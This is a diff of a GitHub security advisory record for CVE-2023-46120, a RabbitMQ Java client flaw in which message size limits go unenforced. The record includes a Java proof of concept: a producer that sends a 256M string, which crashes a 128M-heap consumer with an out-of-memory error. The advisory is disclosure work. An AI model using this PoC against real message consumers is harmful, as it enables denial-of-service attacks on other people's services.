@@ -1,61 +1,16 @@
 {
-  "id": "GHSA-mm8h-8587-p46h",
-  "summary": "RabbitMQ Java client's Lack of Message Size Limitation leads to Remote DoS Attack",
-  "details": "### Summary\n`maxBodyLebgth` was not used when receiving Message objects.  Attackers could just send a very large Message causing a memory overflow and triggering an OOM Error.\n\n### PoC\n#### RbbitMQ\n* Use RabbitMQ 3.11.16 as MQ and specify Message Body size 512M (here it only needs to be larger than the Consumer memory)\n* Start RabbitMQ\n#### Producer\n* Build a String of length 256M and send it to Consumer\n```\n\npackage org.springframework.amqp.helloworld; \n\nimport org.springframework.amqp.core.AmqpTemplate; \nimport org.springframework.context.ApplicationContext; \nimport org.springframework.context.annotation.AnnotationConfigApplicationContext; \n\npublic class Producer {\n    public static void main(String[] args) {\n        ApplicationContext context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);\n        AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class); \n        String s = \"A\";\n        for(int i=0;i<28;++i){\n            s = s + s;\n            System.out.println(i);\n        }\n        amqpTemplate.convertAndSend(s);\n        System.out.println(\"Send Finish\");\n    }\n }\n```\n\n#### Consumer\n* First set the heap memory size to 128M\n* Read the message sent by the Producer from the MQ and print the length\n```\npackage org.springframework.amqp.helloworld;\n\nimport org.springframework.amqp.core.AmqpTemplate;\nimport org.springframework.amqp.core.Message;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.annotation.AnnotationConfigApplicationContext;\n\npublic class Consumer {\n    \n    public static void main(String[] args) {\n        ApplicationContext context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);\n        AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class);\n        Object o = amqpTemplate.receiveAndConvert();\n        if(o != null){\n            String s = o.toString();\n            System.out.println(\"Received Length : \" + s.length());\n        }else{\n            System.out.println(\"null\");\n        }\n    }\n}\n```\n#### Results\n* Run the Producer first, then the Consumer\n* Consumer throws OOM Exception\n\n\n### Impact\nUsers of RabbitMQ may suffer from  DoS attacks from RabbitMQ Java client which will ultimately exhaust the memory of the consumer.\n",
-  "aliases": [
-    "CGA-6h6p-w435-25j2",
-    "CVE-2023-46120"
-  ],
-  "modified": "2024-10-22T05:28:46.862360Z",
-  "published": "2023-10-24T01:49:09Z",
-  "related": [
-    "CVE-2023-46120"
-  ],
-  "database_specific": {
-    "nvd_published_at": "2023-10-25T18:17:36Z",
-    "cwe_ids": [
-      "CWE-400"
-    ],
-    "severity": "MODERATE",
-    "github_reviewed": true,
-    "github_reviewed_at": "2023-10-24T01:49:09Z"
-  },
-  "references": [
-    {
-      "type": "WEB",
-      "url": "https://github.com/rabbitmq/rabbitmq-java-client/security/advisories/GHSA-mm8h-8587-p46h"
-    },
-    {
-      "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46120"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/rabbitmq/rabbitmq-java-client/issues/1062"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/rabbitmq/rabbitmq-java-client/commit/714aae602dcae6cb4b53cadf009323ebac313cc8"
-    },
-    {
-      "type": "PACKAGE",
-      "url": "https://github.com/rabbitmq/rabbitmq-java-client"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/rabbitmq/rabbitmq-java-client/releases/tag/v5.18.0"
-    }
-  ],
   "affected": [
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/10/GHSA-mm8h-8587-p46h/GHSA-mm8h-8587-p46h.json"
+      },
       "package": {
-        "name": "com.rabbitmq:amqp-client",
         "ecosystem": "Maven",
+        "name": "com.rabbitmq:amqp-client",
         "purl": "pkg:maven/com.rabbitmq/amqp-client"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -63,7 +18,8 @@
             {
               "fixed": "5.18.0"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -201,17 +157,61 @@
         "5.7.3",
         "5.8.0",
         "5.9.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/10/GHSA-mm8h-8587-p46h/GHSA-mm8h-8587-p46h.json"
-      }
+      ]
     }
+  ],
+  "aliases": [
+    "CGA-6h6p-w435-25j2",
+    "CVE-2023-46120"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-400"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-10-24T01:49:09Z",
+    "nvd_published_at": "2023-10-25T18:17:36Z",
+    "severity": "MODERATE"
+  },
+  "details": "### Summary\n`maxBodyLebgth` was not used when receiving Message objects.  Attackers could just send a very large Message causing a memory overflow and triggering an OOM Error.\n\n### PoC\n#### RbbitMQ\n* Use RabbitMQ 3.11.16 as MQ and specify Message Body size 512M (here it only needs to be larger than the Consumer memory)\n* Start RabbitMQ\n#### Producer\n* Build a String of length 256M and send it to Consumer\n```\n\npackage org.springframework.amqp.helloworld; \n\nimport org.springframework.amqp.core.AmqpTemplate; \nimport org.springframework.context.ApplicationContext; \nimport org.springframework.context.annotation.AnnotationConfigApplicationContext; \n\npublic class Producer {\n    public static void main(String[] args) {\n        ApplicationContext context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);\n        AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class); \n        String s = \"A\";\n        for(int i=0;i<28;++i){\n            s = s + s;\n            System.out.println(i);\n        }\n        amqpTemplate.convertAndSend(s);\n        System.out.println(\"Send Finish\");\n    }\n }\n```\n\n#### Consumer\n* First set the heap memory size to 128M\n* Read the message sent by the Producer from the MQ and print the length\n```\npackage org.springframework.amqp.helloworld;\n\nimport org.springframework.amqp.core.AmqpTemplate;\nimport org.springframework.amqp.core.Message;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.annotation.AnnotationConfigApplicationContext;\n\npublic class Consumer {\n    \n    public static void main(String[] args) {\n        ApplicationContext context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);\n        AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class);\n        Object o = amqpTemplate.receiveAndConvert();\n        if(o != null){\n            String s = o.toString();\n            System.out.println(\"Received Length : \" + s.length());\n        }else{\n            System.out.println(\"null\");\n        }\n    }\n}\n```\n#### Results\n* Run the Producer first, then the Consumer\n* Consumer throws OOM Exception\n\n\n### Impact\nUsers of RabbitMQ may suffer from  DoS attacks from RabbitMQ Java client which will ultimately exhaust the memory of the consumer.\n",
+  "id": "GHSA-mm8h-8587-p46h",
+  "modified": "2024-10-22T05:28:46.862360Z",
+  "published": "2023-10-24T01:49:09Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-java-client/security/advisories/GHSA-mm8h-8587-p46h"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46120"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-java-client/issues/1062"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-java-client/commit/714aae602dcae6cb4b53cadf009323ebac313cc8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/rabbitmq/rabbitmq-java-client"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-java-client/releases/tag/v5.18.0"
+    }
+  ],
+  "related": [
+    "CVE-2023-46120"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "RabbitMQ Java client's Lack of Message Size Limitation leads to Remote DoS Attack"
 }
